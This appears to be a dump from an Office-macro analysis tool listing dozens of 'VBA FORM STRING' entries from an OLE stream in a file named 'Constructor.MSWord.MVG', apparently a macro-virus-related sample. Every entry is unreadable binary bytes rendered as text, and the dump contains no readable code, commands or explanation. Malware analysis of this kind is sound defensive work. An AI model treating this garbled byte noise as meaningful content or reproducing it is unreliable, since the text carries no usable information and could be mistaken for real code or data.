VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{A�/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R�T����x.5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~)�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�xS#動�T3p���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�`Nv/9ɓ�b�w|��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�҈�;Q�p�w����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N�͂W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O^]�b�?�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�E��C�i�W�Q*��+�3v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.`'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L���%�.�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)6��. ��jw;��ʒ�o1*��EW�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kٖʲ�3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;2�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ҏ���=�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A:ֻ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L����kzW�`��0&o��c�j�����:�h����$��Eâ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1D��C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:T�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�RӸQ3@#3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,רQ3pYr!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

 �@�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�R1�,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��, p���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��XR/;w?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4�.���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A������Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���3a+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\+���RB!
P�L�W����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R	�2T�B��I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��.w��r(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;���)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C��	'�5*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P-XY���Q�n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X	��V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
eTu��0e��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�HR��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���xSȢ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�BRͯ��`��o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A��c:\��������BX��E]��!.�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�h�"E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&Th����C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
40�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�0����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\$i��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"X��bJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rda�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(�<y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�C�%X�H��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WpL*�!Չ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ȓq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o���K҂�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��H:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0h�`p\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Hքc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���\��X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���I!/��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qw�$b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R	�V`���

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y��ɜ

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�[����{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��IDȅ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
50nQëV��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~'�pE��s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a��0_�e*���78���$RA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:1K��48
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I��D�Ȅ� ꄱ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2h��N\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I>�VXN�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dx!?�&�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jͱ�lbʯ��:+>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7d���>t���>�1(����"
�c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)��Cm��
J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.Z@$Ͷ3���ȼp6:����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XH�#�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x+��R*`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A�㪆
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�@ �䔮�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9������F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�&r2̇*@���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t6�:񣵐d��9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X���&ḅ�D�)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_e,��~z���"R�����R��C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�;���s'�6E�N;9\AMma����R���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l�V?,�1I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`�6=��U*����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ߜ��ӂ$��Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���a�$�Ϟ�-B�d�8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l<�쪭N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l�d��L`-!w՛�4?��HA�j�jZ�MW3��{ ��&pO�z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*�b�o"���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ć$��ܭ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���"R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E;�1�Ckm�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$B����σ��^q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8цV<�Z��]�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.\�`9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̗��l�v��:Y�!�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z���-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[KR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�I����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,����0W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4��}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V3�9�X�~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�'��}-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�R-W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Odc6é�"5Zԧ>T��8JeK�PG�s�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�۟�bp
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��e9�k��D@�ԍ�[�B�
Xt4M!�'o�Ն�r��0�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h�¶�hEI�y^	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%'V�ᇼŘ�a�kJ���Fr0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�u<��O8p#�`k.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!6�;p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D���B59��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I@l�Y�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�zVu�t+9��_�:�ښ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ȫ4����b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���)�ae
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]��e8��q�3�&7)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ޣ�ӱ�X�#�3�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ɂ�`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g����d��bPZ�b�	����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�$,�޴@_
-------------------------------------------------------------------------------
